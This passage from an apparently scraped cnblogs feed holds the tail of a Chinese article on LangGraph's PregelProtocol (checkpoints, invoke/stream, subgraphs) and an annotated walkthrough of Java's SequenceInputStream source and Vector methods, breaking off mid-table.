graph.draw_mermaid_png()\nPILImage.open(io.BytesIO(bytes)).show()\n</code></pre>\n<p>在将StateGraph编译成Pregel对象后，我们调用其get_graph方法得到对应的Graph对象。我们以两种形式呈现其结构，前者通过调用print_ascii方法以ASCII字符的形式输出图结构，后者调用draw_mermaid_png方法生成一张PNG图片。下图左右两部分分别展现了两种呈现方式的效果。</p>\n<h2 id=\"3-持久化\">3. 持久化</h2>\n<p>为了支持“中断/恢复”的执行方式，同时为“时间旅行”提供支持，图必须利用持久化的方式将执行过程的重要时刻的状态保存下来。LangGraph采用基于<code>Checkpoint</code>的持久化形式，对于指定的每个任务，不论是执行成功针对Channel的写入意图，还是抛出异常、人为中断或者Resume Value的提供，都会以Pending Write的形式被记录下来；当超步成功完成，针对Channel的写入被成功应用，这些Pending Write被丢弃，换来一个Checkpoint来描述当前的状态。</p>\n<p>作为“LangGraph 执行体”的抽象，PregelProtocol定义了<code>get_state/aget_state</code>方法用于读取在某个Superstep由Checkpoint（对于最后一个未完成的Superstep，还包括Pending Write）构建的状态快照，该快照体现为一个StateSnapshot对象。<code>get_state_history/aget_state_history</code>返回由这些快照谱写的一段历史。</p>\n<pre><code class=\"language-python\">class PregelProtocol(Runnable[InputT, Any], Generic[StateT, ContextT, InputT, OutputT]):\n    @abstractmethod\n    def get_state(\n        self, config: RunnableConfig, *, subgraphs: bool = False\n    ) -&gt; StateSnapshot: ...\n\n    @abstractmethod\n    async def aget_state(\n        self, config: RunnableConfig, *, subgraphs: bool = False\n    ) -&gt; StateSnapshot: ...\n\n    @abstractmethod\n    def get_state_history(\n        self,\n        config: RunnableConfig,\n        *,\n        filter: dict[str, Any] | None = None,\n        before: RunnableConfig | None = None,\n        limit: int | None = None,\n    ) -&gt; Iterator[StateSnapshot]: ...\n\n    @abstractmethod\n    def aget_state_history(\n        self,\n        config: RunnableConfig,\n        *,\n        filter: dict[str, Any] | None = None,\n        before: RunnableConfig | None = None,\n        limit: int | None = None,\n    ) -&gt; AsyncIterator[StateSnapshot]: ...\n\n    @abstractmethod\n    def bulk_update_state(\n        self,\n        config: RunnableConfig,\n        updates: Sequence[Sequence[StateUpdate]],\n    ) -&gt; RunnableConfig: ...\n\n    @abstractmethod\n    async def abulk_update_state(\n        self,\n        config: RunnableConfig,\n        updates: Sequence[Sequence[StateUpdate]],\n    ) -&gt; RunnableConfig: ...\n\n    @abstractmethod\n    def update_state(\n        self,\n        config: RunnableConfig,\n        values: dict[str, Any] | Any | None,\n        as_node: str | None = None,\n    ) -&gt; RunnableConfig: ...\n\n    @abstractmethod\n    async def aupdate_state(\n        self,\n        config: RunnableConfig,\n        values: dict[str, Any] | Any | None,\n        as_node: str | None = None,\n    ) -&gt; RunnableConfig: ...\n</code></pre>\n<p>持久化存储的Checkpoint不仅使我们可以回顾历史，还可以提供“时间旅行”，使我们可以从某个历史时刻重新执行后面的流程。不仅如此，PregelProtocol还提供了<code>update_state /bulk_update_state/abulk_update_state</code>可以直接修改状态。但是它们并非“篡改历史”，只是基于某个在某个历史时刻开启了另一段“平行宇宙”而已。持久化使LangGraph.Pregel作为核心和部分，我们将在后续部分对它进行专门的介绍。</p>\n<h2 id=\"4-两种调用方式\">4. 两种调用方式</h2>\n<p>PregelProtocol的<code>invoke/ainvoke</code>和<code>stream/astream</code>方法体现了针对 “LangGraph 执行体” 两种调用方式。前者采用简单的请求/回复消息交换模式，客户端需要等整个流程结束之后采用得到结果。如果整个处理流程比较复杂，或者涉及一些耗时的操作，过长的等待会带来糟糕的体验。后者采用流式处理使客户端可以实施得到处理的中间结果或者感知到处理的进度。我们将在后续部分对流式处理进行单独介绍。</p>\n<pre><code class=\"language-python\">class PregelProtocol(Runnable[InputT, Any], Generic[StateT, ContextT, InputT, OutputT]):\n    @abstractmethod\n    def stream(\n        self,\n        input: InputT | Command | None,\n        config: RunnableConfig | None = None,\n        *,\n        context: ContextT | None = None,\n        stream_mode: StreamMode | list[StreamMode] | None = None,\n        interrupt_before: All | Sequence[str] | None = None,\n        interrupt_after: All | Sequence[str] | None = None,\n        subgraphs: bool = False,\n    ) -&gt; Iterator[dict[str, Any] | Any]: ...\n\n    @abstractmethod\n    def astream(\n        self,\n        input: InputT | Command | None,\n        config: RunnableConfig | None = None,\n        *,\n        context: ContextT | None = None,\n        stream_mode: StreamMode | list[StreamMode] | None = None,\n        interrupt_before: All | Sequence[str] | None = None,\n        interrupt_after: All | Sequence[str] | None = None,\n        subgraphs: bool = False,\n    ) -&gt; AsyncIterator[dict[str, Any] | Any]: ...\n\n    @abstractmethod\n    def invoke(\n        self,\n        input: InputT | Command | None,\n        config: RunnableConfig | None = None,\n        *,\n        context: ContextT | None = None,\n        interrupt_before: All | Sequence[str] | None = None,\n        interrupt_after: All | Sequence[str] | None = None,\n    ) -&gt; dict[str, Any] | Any: ...\n\n    @abstractmethod\n    async def ainvoke(\n        self,\n        input: InputT | Command | None,\n        config: RunnableConfig | None = None,\n        *,\n        context: ContextT | None = None,\n        interrupt_before: All | Sequence[str] | None = None,\n        interrupt_after: All | Sequence[str] | None = None,\n    ) -&gt; dict[str, Any] | Any: ...\n</code></pre>\n<p>执行体支持中断/恢复（interrupt/resume）的方式执行，所以在中断时需要将当时的状态以 “Checkpoint（Checkpoint）” 的形式保存下来，恢复执行的时候利用它们将当时的 “执行线程” 复原。Checkpointing的机制也使 “时间旅行” 成为可能，我们可以从任一Checkpoint开始执行。也正是因为此持久化机制的存在，我们可以提取某一个Superstep的状态，还可以查看整个执行历史，这两个功能分别对应PregelProtocol的<code>get_state/aget_state</code>和<code>get_state_history/aget_state_history</code>方法。具体的状态以StateSnapshot对象描述的快照表示。</p>\n<p>执行体应该具有将执行结果作为新的状态进行保存的能力，所以PregelProtocol定义了<code>update_state/aupdate_state</code>和<code>bulk_update_state/abulk_update_state</code>方法，前者保存单一状态更新，后者对多个状态更新进行批量执行。单一状态更新通过如下这个名为StateUpdate的命名元组表示，我们不仅可以利用values字段得到以字典形式表示的状态值，还可以通过<code>as_node</code>和<code>task_id</code>字段的得到实施更新的Node和具体任务标识。</p>\n<pre><code class=\"language-python\">class StateUpdate(NamedTuple):\n    values: dict[str, Any] | None\n    as_node: str | None = None\n    task_id: str | None = None\n</code></pre>\n<p>执行体支持两种基本的操作，一种采用单纯的请求/响应消息交换模式，另一种以流的形式实时返回数据，它们分别对应<code>invoke/ainvoke</code>和<code>stream/astream</code>方法。</p>\n<h2 id=\"5-嵌套结构\">5. 嵌套结构</h2>\n<p>我们一直在强调图的“嵌套”结构，这种结构也可以从Pregel、PregelNode和PregelProtocol在三个类型的定义。一个Pregel是PregelProtocol的实现、作为其节点的PregelNode对象可以由一个或者多个PregelProtocol组成，对于表示 “子图” 的subgraphs字段，并且该字段返回一个PregelProtocol对象的序列。Pregel的subgraphs方法返回的子图就来源于组成它的Node。</p>\n<pre><code class=\"language-python\">class PregelNode:\n    subgraphs\t: Sequence[PregelProtocol]\n\nclass Pregel(\n    PregelProtocol[StateT, ContextT, InputT, OutputT],\n    Generic[StateT, ContextT, InputT, OutputT]):\n    def get_subgraphs(\n        self, *, namespace: str | None = None, recurse: bool = False\n    ) -&gt; Iterator[tuple[str, PregelProtocol]]\n\n    async def aget_subgraphs(\n        self, *, namespace: str | None = None, recurse: bool = False\n    ) -&gt; AsyncIterator[tuple[str, PregelProtocol]]\n</code></pre>\n<p>PregelNode的subgraphs字段提供了 “子图” 的静态注册，其实任何一个Pregel对象都可以在无需注册前提下被另一个Pregel的Node调用，而且反映当前执行上下文的一些执行配置会通过上下文变量（ContenxtVars） “流向” 作为子图的Pregel对象。前面我们演示子图调用涉及的Checkpoint命名空间的例子已经充分体现了这一点。但是这种显式的静态声明对于图的静态图分析与可视化有着积极的作用。</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-16 07:22</span>&nbsp;\n<a href=\"https://www.cnblogs.com/jaydenai\">JaydenAI</a>&nbsp;\n阅读(<span id=\"post_view_count\">42</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "8、SequenceInputStream的源码和Vector.class的一些函数说明（windows操作系统，JDK8）",
      "link": "https://www.cnblogs.com/Carey-ccl/p/19618752",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/Carey-ccl/p/19618752\" id=\"cb_post_title_url\" title=\"发布于 2026-02-15 22:25\">\n    <span>8、SequenceInputStream的源码和Vector.class的一些函数说明（windows操作系统，JDK8）</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h4 id=\"一sequenceinputstream源码可以顺序读取多个输入stream的装饰器类\">一、SequenceInputStream源码——可以顺序读取多个输入Stream的装饰器类</h4>\n<p>  SequenceInputStream.class 的UML关系图，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>  SequenceInputStream.class的源码，如下所示：</p>\n<pre><code>package java.io;\nimport java.io.InputStream;\nimport java.util.Enumeration;\nimport java.util.Vector;\n\npublic\nclass SequenceInputStream extends InputStream {\n    //顺序（序列化）装载多个被装饰输入Stream的集合，一般是Vector实例\n    Enumeration&lt;? extends InputStream&gt; e;\n    InputStream in;//顺序（序列化）装载多个被装饰输入Stream的集合中当前正在被SequenceInputStream 对象使用的被装饰的输入Stream\n    \n    //构造函数，传入一个顺序（序列化）装载多个被装饰输入Stream的集合\n    public SequenceInputStream(Enumeration&lt;? extends InputStream&gt; e) {\n        this.e = e;\n        try {\n            nextStream();\n        } catch (IOException ex) {\n            // This should never happen\n            throw new Error(\"panic\");\n        }\n    }\n    \n    //构造函数，可以将2个被装饰的输入Stream放入到集合中\n    public SequenceInputStream(InputStream s1, InputStream s2) {\n        Vector&lt;InputStream&gt; v = new Vector&lt;&gt;(2);\n\n        v.addElement(s1);\n        v.addElement(s2);\n        e = v.elements();\n        try {\n            nextStream();\n        } catch (IOException ex) {\n            // This should never happen\n            throw new Error(\"panic\");\n        }\n    }\n    //获取集合中下一个被装饰的输入Stream\n    final void nextStream() throws IOException {\n        if (in != null) {\n            in.close();//先关闭当前被装饰的输入Stream\n        }\n\n        if (e.hasMoreElements()) {//如果集合中还有被装饰的输入Stream\n            in = (InputStream) e.nextElement();//获取集合中下一个被装饰的输入Stream\n            if (in == null)\n                throw new NullPointerException();//如果集合中下一个被装饰的输入Stream为null，抛出一个NullPointerException\n        }\n        else in = null;//如果集合中没有了被装饰的输入Stream，将当前正在使用的被装饰的输入Stream置为null\n\n    }\n    \n    //判断当前正在使用的被装饰的输入Stream是否还有可以读取的字节数据\n    public int available() throws IOException {\n        if (in == null) {\n            return 0; // no way to signal EOF from available()\n        }\n        return in.available();\n    }\n    \n    //从SequenceInputStream 对象的集合（该集合放着多个被装饰的输入Stream）中读取1个字节\n    public int read() throws IOException {\n        while (in != null) {//如果in!=null，则说明当前这个SequenceInputStream 对象的集合中还有被装饰的输入Stream没有关闭\n            int c = in.read();//从当前正在使用的被装饰的被装饰输入Stream中读取1个字节\n            if (c != -1) {//c != -1说明从当前正在使用的被装饰输入Stream中读取到了字节\n                return c;//返回读取到的这个字节\n            }\n            nextStream();//如果c==-1说明当前正在使用的被装饰输入Stream中字节（byte）数据已经读完，获取SequenceInputStream 对象的集合中下一个被装饰的输入Stream\n        }\n        return -1;//如果SequenceInputStream 对象的集合中所有被装饰的输入Stream中的字节（byte）数据都已经读完，返回-1\n    }\n\n    //从SequenceInputStream 对象的集合（该集合放着多个被装饰的输入Stream）中读取len个字节，放入到byte[]数组b的[off,off+len)（左闭右开，不包括off+len）索引位置\n    public int read(byte b[], int off, int len) throws IOException {\n        if (in == null) {//如果in==null，则说明当前这个SequenceInputStream 对象的集合中所有被装饰的输入Stream都已经关闭\n            return -1;\n        } else if (b == null) {\n            throw new NullPointerException();//如果byte[]数组b==null，抛出一个NullPointerException\n        } else if (off &lt; 0 || len &lt; 0 || len &gt; b.length - off) {//相当于off + len &gt; b.length（源码中这样写代码的好处我没看出来）\n            throw new IndexOutOfBoundsException();\n        } else if (len == 0) {\n            return 0;//要从SequenceInputStream 对象的集合（该集合放着至少2个被装饰的输入Stream）中读取的len个字节==0时，返回0\n        }\n        do {\n            int n = in.read(b, off, len);//从当前正在使用的被装饰的输入Stream中读取len个字节，放入到byte[]数组b的[off,off+len)（左闭右开，不包括off+len）索引位置\n            if (n &gt; 0) {\n                return n;//只要能从当前正在使用的被装饰的输入Stream中读取到字节，则返回读取的数量\n            }\n            nextStream();//此时n==-1，说明当前正在使用的被装饰的输入Stream中字节（byte）数据已经读完，获取SequenceInputStream 对象的集合中下一个被装饰的输入Stream\n        } while (in != null);//SequenceInputStream 对象的集合中下一个被装饰的输入Stream为null时，跳出循环，返回-1\n        return -1;\n    }\n    //顺序关闭SequenceInputStream 对象的集合中所有被装饰的输入Stream\n    public void close() throws IOException {\n        do {\n            nextStream();\n        } while (in != null);\n    }\n}\n</code></pre>\n<h5 id=\"11sequenceinputstream的read函数和nextstream函数\">1.1、SequenceInputStream的read()函数和nextStream()函数</h5>\n<pre><code>package java.io;\nimport java.io.InputStream;\nimport java.util.Enumeration;\nimport java.util.Vector;\n\npublic\nclass SequenceInputStream extends InputStream {\n    ...省略部分代码...\n    //顺序（序列化）存储多个被装饰的输入Stream的集合，一般是Vector实例\n    Enumeration&lt;? extends InputStream&gt; e;\n    InputStream in;//顺序（序列化）装载多个被装饰输入Stream的集合中当前正在被SequenceInputStream 对象使用的被装饰的输入Stream\n    //获取集合中下一个被装饰的输入Stream\n    final void nextStream() throws IOException {\n        if (in != null) {\n            in.close();//先关闭当前被装饰的输入Stream\n        }\n\n        if (e.hasMoreElements()) {//如果集合中还有被装饰的输入Stream\n            in = (InputStream) e.nextElement();//获取集合中下一个被装饰的输入Stream\n            if (in == null)\n                throw new NullPointerException();//如果集合中下一个被装饰的输入Stream为null，抛出一个NullPointerException\n        }\n        else in = null;//如果集合中没有了被装饰的输入Stream，将当前正在使用的被装饰的输入Stream置为null\n\n    }\n    \n    //从SequenceInputStream 对象的集合（该集合放着多个被装饰的输入Stream）中读取1个字节\n    public int read() throws IOException {\n        while (in != null) {//如果in!=null，则说明当前这个SequenceInputStream 对象的集合中还有被装饰的输入Stream没有关闭\n            int c = in.read();//从当前正在使用的被装饰的被装饰输入Stream中读取1个字节\n            if (c != -1) {//c != -1说明从当前正在使用的被装饰输入Stream中读取到了字节\n                return c;//返回读取到的这个字节\n            }\n            nextStream();//如果c==-1说明当前正在使用的被装饰输入Stream中字节（byte）数据已经读完，获取SequenceInputStream 对象的集合中下一个被装饰的输入Stream\n        }\n        return -1;//如果SequenceInputStream 对象的集合中所有被装饰的输入Stream中的字节（byte）数据都已经读完，返回-1\n    }\n    ...省略部分代码...\n}\n</code></pre>\n<p>如果使用者用的是2个被装饰的输入Stream（此处为FileInputStream），构造的SequenceInputStream的对象，如下所示（伪代码）：</p>\n<pre><code>is1 = new FileInputStream(\"D:\\\\data1.txt\");\nis2 = new FileInputStream(\"D:\\\\data2.txt\");\nsequenceInputStream = new SequenceInputStream(is1, is2);\n</code></pre>\n<p>那么，SequenceInputStream对象中Vector集合的容量是2，如果此时执行SequenceInputStream.class::read()函数。</p>\n<pre><code>//伪代码\nint readByte = -1;\nwhile ((readByte = sequenceInputStream.read()) != -1) {\n   System.out.print((char) readByte);\n}\n</code></pre>\n<p>过程如下（假设2个被装饰的输入Stream（此处为FileInputStream）中的字节数据如下）：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>①、先执行第1个被装饰的输入Stream（也是Vector集合的第1个元素）的read()函数，直到该函数返回-1，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>②、关闭第1个被装饰的输入Stream（也是Vector集合的第1个元素），再执行第2个被装饰的输入Stream（也是Vector集合的第2个元素）的read()函数，直到该函数返回-1，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<h6 id=\"111使用举例\">1.1.1、使用举例</h6>\n<p>  下面这个例子就恰当的使用SequenceInputStream的read()函数；</p>\n<ul>\n<li>\n<p>我的windows操作系统的D盘根目录下有2个txt文件，一个是data1.txt，另一个是data2.txt文件，这2个文件中总共有30个字节，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n</li>\n<li>\n<p>使用者可以用一个SequenceInputStream对象装饰2个被装饰的输入Stream（此处为FileInputStream），如下代码所示：</p>\n</li>\n</ul>\n<pre><code>package com.chelong.StreamAndReader;\n\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.SequenceInputStream;\n\npublic class SequenceInputStreamTest {\n   public static void main(String[] args) {\n      InputStream is1 = null;\n      InputStream is2 = null;\n      SequenceInputStream sequenceInputStream = null;\n      try {\n         is1 = new FileInputStream(\"D:\\\\data1.txt\");\n         is2 = new FileInputStream(\"D:\\\\data2.txt\");\n         sequenceInputStream = new SequenceInputStream(is1, is2);\n         int readByte = -1;\n         while ((readByte = sequenceInputStream.read()) != -1) {\n            System.out.print((char) readByte);\n         }\n      } catch (IOException e) {\n         e.printStackTrace();\n      } finally {\n          //此处省略关闭所有的Stream的代码\n      }\n   }\n}\n</code></pre>\n<p>程序运行结果，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<h5 id=\"12sequenceinputstream的readbyte-b-int-off-int-len函数和nextstream函数\">1.2、SequenceInputStream的read(byte b[], int off, int len)函数和nextStream()函数</h5>\n<pre><code>package java.io;\nimport java.io.InputStream;\nimport java.util.Enumeration;\nimport java.util.Vector;\n\npublic\nclass SequenceInputStream extends InputStream {\n    ...省略部分代码...\n    //顺序（序列化）装载多个被装饰输入Stream的集合，一般是Vector实例\n    Enumeration&lt;? extends InputStream&gt; e;\n    InputStream in;//顺序（序列化）装载多个被装饰输入Stream的集合中当前正在被SequenceInputStream 对象使用的被装饰的输入Stream\n    //获取集合中下一个被装饰的输入Stream\n    final void nextStream() throws IOException {\n        if (in != null) {\n            in.close();//先关闭当前被装饰的输入Stream\n        }\n\n        if (e.hasMoreElements()) {//如果集合中还有被装饰的输入Stream\n            in = (InputStream) e.nextElement();//获取集合中下一个被装饰的输入Stream\n            if (in == null)\n                throw new NullPointerException();//如果集合中下一个被装饰的输入Stream为null，抛出一个NullPointerException\n        }\n        else in = null;//如果集合中没有了被装饰的输入Stream，将当前正在使用的被装饰的输入Stream置为null\n\n    }\n    \n    //从SequenceInputStream 对象的集合（该集合放着多个被装饰的输入Stream）中读取len个字节，放入到byte[]数组b的[off,off+len)（左闭右开，不包括off+len）索引位置\n    public int read(byte b[], int off, int len) throws IOException {\n        if (in == null) {//如果in==null，则说明当前这个SequenceInputStream 对象的集合中所有被装饰的输入Stream都已经关闭\n            return -1;\n        } else if (b == null) {\n            throw new NullPointerException();//如果byte[]数组b==null，抛出一个NullPointerException\n        } else if (off &lt; 0 || len &lt; 0 || len &gt; b.length - off) {//相当于off + len &gt; b.length（源码中这样写代码的好处我没看出来）\n            throw new IndexOutOfBoundsException();\n        } else if (len == 0) {\n            return 0;//要从SequenceInputStream 对象的集合（该集合放着至少2个被装饰的输入Stream）中读取的len个字节==0时，返回0\n        }\n        do {\n            int n = in.read(b, off, len);//从当前正在使用的被装饰的输入Stream中读取len个字节，放入到byte[]数组b的[off,off+len)（左闭右开，不包括off+len）索引位置\n            if (n &gt; 0) {\n                return n;//只要能从当前正在使用的被装饰的输入Stream中读取到字节，则返回读取的数量\n            }\n            nextStream();//此时n==-1，说明当前正在使用的被装饰的输入Stream中字节（byte）数据已经读完，获取SequenceInputStream 对象的集合中下一个被装饰的输入Stream\n        } while (in != null);//SequenceInputStream 对象的集合中下一个被装饰的输入Stream为null时，跳出循环，返回-1\n        return -1;\n    }\n    ...省略部分代码...\n}\n</code></pre>\n<p>如果使用者用的是2个被装饰的输入Stream（此处为FileInputStream），构造的SequenceInputStream的对象，如下所示（伪代码）：</p>\n<pre><code>is1 = new FileInputStream(\"D:\\\\data1.txt\");\nis2 = new FileInputStream(\"D:\\\\data2.txt\");\nsequenceInputStream = new SequenceInputStream(is1, is2);\n</code></pre>\n<p>那么，SequenceInputStream对象中Vector集合的容量是2，并且假设这2个被装饰的输入Stream（此处为FileInputStream）中的字节数据如下：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>如果此时执行SequenceInputStream.class::read()函数。接下来使用SequenceInputStream对象读取字节数据到使用者创建的byte[]数组，如果使用者创建的字节数组byte[]的长度&gt;=第1个被装饰的输入Stream中的所有字节个数，比如，使用者创建的byte[]数组的长度为12，如下所示（伪代码）：</p>\n<pre><code>int readByte = -1;\nbyte[] buff = new byte[12];\nwhile ((readByte = sequenceInputStream.read(buff, 0, buff.length)) != -1) {\n   for (int i = 0; i &lt; readByte; i++) {\n      System.out.print((char) buff[i]);\n   }\n}\n</code></pre>\n<p>整个执行过程如下：<br />\n①、第1次进入read()函数<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>②、第2次进入read()函数（<em><strong>重点是当前正在使用的被装饰的输入Stream中的字节数据已经读取完了时，再次读取，会返回-1，不会返回0</strong></em>）<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>③、第3次进入read()函数<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>④、第4次进入read()函数（<em><strong>重点是当前正在使用的被装饰的输入Stream中的字节数据已经读取完了时，再次读取，会返回-1，不会返回0</strong></em>）<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>最终使用者创建的byte[]数组中的字节（byte）数据，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<h6 id=\"121使用举例\">1.2.1、使用举例</h6>\n<p>  下面这个例子就恰当的使用SequenceInputStream的read()函数；</p>\n<ul>\n<li>\n<p>我的windows操作系统的D盘根目录下有2个txt文件，一个是data1.txt，另一个是data2.txt文件，这2个文件中总共有30个字节，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n</li>\n<li>\n<p>使用者可以用一个SequenceInputStream对象装饰2个被装饰的输入Stream（此处为FileInputStream），如下代码所示：</p>\n</li>\n</ul>\n<pre><code>package com.chelong.StreamAndReader;\n\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.SequenceInputStream;\nimport java.util.Vector;\n\npublic class SequenceInputStreamTest {\n   public static void main(String[] args) {\n      InputStream is1 = null;\n      InputStream is2 = null;\n      SequenceInputStream sequenceInputStream = null;\n      try {\n         is1 = new FileInputStream(\"D:\\\\data1.txt\");\n         is2 = new FileInputStream(\"D:\\\\data2.txt\");\n         Vector&lt;InputStream&gt; vector = new Vector&lt;InputStream&gt;();\n         vector.addElement(is1);\n         vector.addElement(is2);\n         sequenceInputStream = new SequenceInputStream(vector.elements());\n         int readByte = -1;\n         byte[] buff = new byte[12];\n         while ((readByte = sequenceInputStream.read(buff, 0, buff.length)) != -1) {\n            for (int i = 0; i &lt; readByte; i++) {\n               System.out.print((char) buff[i]);\n            }\n         }\n         System.out.println();\n         System.out.println(\"最终留在byte[]数组buff中的字节：\");\n         for (byte b : buff) {\n            System.out.print((char) b);\n         }\n      } catch (IOException e) {\n         e.printStackTrace();\n      } finally {\n         try {\n            if (is1 != null) is1.close();\n            if (is2 != null) is1.close();\n            if (sequenceInputStream != null) sequenceInputStream.close();\n         } catch (IOException e) {\n            e.printStackTrace();\n         }\n      }\n   }\n}\n</code></pre>\n<p>程序运行结果，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<h4 id=\"二vectorclass的一些函数说明\">二、Vector.class的一些函数说明</h4>\n<p>  Vector 与 ArrayList 一样，也是通过数组实现的，不同的是它支持线程的同步，即某一时刻只有一个线程能够写 Vector，避免多线程同时写而引起的不一致性，但实现同步需要很高的花费，因此，访问它比访问 ArrayList慢。Vector的UML图，如下所示：<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<h5 id=\"21构造函数\">2.1、构造函数</h5>\n<table>\n<thead>\n<tr>\n<th style=\"text-align: left;\">函数名</th>\n<th style=\"text-align: left;\">函数说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: left;\">public Vector()</td>\n<td style=\"text-align: left;\">此构造函数创建的Vector中，Object[]数组的初始长度为10，capacityIncrement=0（capacityIncrement表示扩容时Object[]数组增加的长度，如果等于0的话，当Object[]数组需要扩容时，新的数组长度=2*旧数组的长度，但是新的数组长度最大为2^31-8）</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">public Vector(int initialCapacity)</td>\n<td style=\"text-align: left;\">此构造函数创建的Vector中，Object[]数组的初始长度为initialCapacity，capacityIncrement=0（capacityIncrement表示扩容时Object[]数组增加的长度，如果等于0的话，当Object[]数组需要扩容时，新的数组长度=2*旧数组的长度，但是新的数组长度最大为2^31-8）</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">public Vector(int initialCapacity, int capacityIncrement)</td>\n<td style=\"text-align: left;\">此构造函数创建的Vector中，Object[]数组的初始长度为initialCapacity，capacityIncrement=capacityIncrement（capacityIncrement表示扩容时Object[]数组增加的长度，如果等于0的话，当Object[]数组需要扩容时，新的数组长度=2*旧数组的长度，但是新的数组长度最大为2^31-8）</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">public Vector(Collection&lt;? extends E&gt; c)</td>\n<td style=\"text-align: left;\">此构造函数创建的Vector中，Object[]数组的初始长度为传入集合Collection&lt;? extends E&gt; c的长度，capacityIncrement=0（capacityIncrement表示扩容时Object[]数组增加的长度，如果等于0的话，当Object[]数组需要扩容时，新的数组长度=2*旧数组的长度，但是新的数组长度最大为2^31-8）</td>\n</tr>\n</tbody>\n</table>\n<p>2.2、常用函数</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align: left;\">函数名</th>\n<th style=\"text-align: left;\">函数说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: left;\">boolean add(E o)</td>\n<td style=\"text-align: left;\">此函数将指定的元素追加到此Vector的末尾，该函数与addElement()函数的区别是，该()函数是List.interface接口规定的函数，addElement()函数是Vector自己实现的（接口中没有规定addElement()函数）</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">void add(int index, E element)</td>\n<td style=\"text-align: left;\">此函数将指定的元素插入此Vector中的指定索引位置</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">boolean addAll(Collection&lt;? extends E&gt; c)</td>\n<td style=\"text-align: left;\">此函数将指定Collection中的所有元素追加到此Vector的末尾</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">boolean addAll(int index, Collection&lt;? extends E&gt; c)</td>\n<td style=\"text-align: left;\">此函数将指定Collection中的所有元素插入到此Vector中的指定索引位置</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">void addElement(E obj)</td>\n<td style=\"text-align: left;\">此函数将指定的元素追加到此Vector的末尾，这个函数与add()函数的区别是，add()函数是List.interface接口规定的函数，这个函数是Vector自己实现的（接口中没有规定该函数）</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">int capacity()</td>\n<td style=\"text-align: left;\">此函数返回此Vector的当前容量</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">void clear()</td>\n<td style=\"text-align: left;\">此函数从此Vector中删除所有元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">Object clone()</td>\n<td style=\"text-align: left;\">此函数返回此Vector的克隆对象</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">boolean contains(Object elem)</td>\n<td style=\"text-align: left;\">如果此Vector包含指定的元素，则此函数返回true</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">boolean containsAll(Collection&lt;?&gt; c)</td>\n<td style=\"text-align: left;\">如果此Vector包含指定Collection中的所有元素，则此函数返回true</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">void copyInto(Object[] anArray)</td>\n<td style=\"text-align: left;\">此方法将此向量的组件复制到指定的数组中</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">E elementAt(int index)</td>\n<td style=\"text-align: left;\">此函数返回Vector指定索引处的元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">Enumeration elements()</td>\n<td style=\"text-align: left;\">此函数返回此Vector中所包含的所有元素的枚举。</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">void ensureCapacity(int minCapacity)</td>\n<td style=\"text-align: left;\">此函数可增加此Vector的容量，以确保它至少可以保存最小容量元素个数</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">boolean equals(Object o)</td>\n<td style=\"text-align: left;\">此函数将指定的Object与此Vector进行比较以获得相等性</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">E firstElement()</td>\n<td style=\"text-align: left;\">返回此Vector的第一个元素（位于Object[]数组索引 0 处的元素）</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">E get(int index)</td>\n<td style=\"text-align: left;\">返回Vector中指定索引位置的元素</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">int indexOf(Object elem)</td>\n<td style=\"text-align: left;\">搜索给定参数的第一个匹配项，使用 equals ()函数测试相等性</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">int 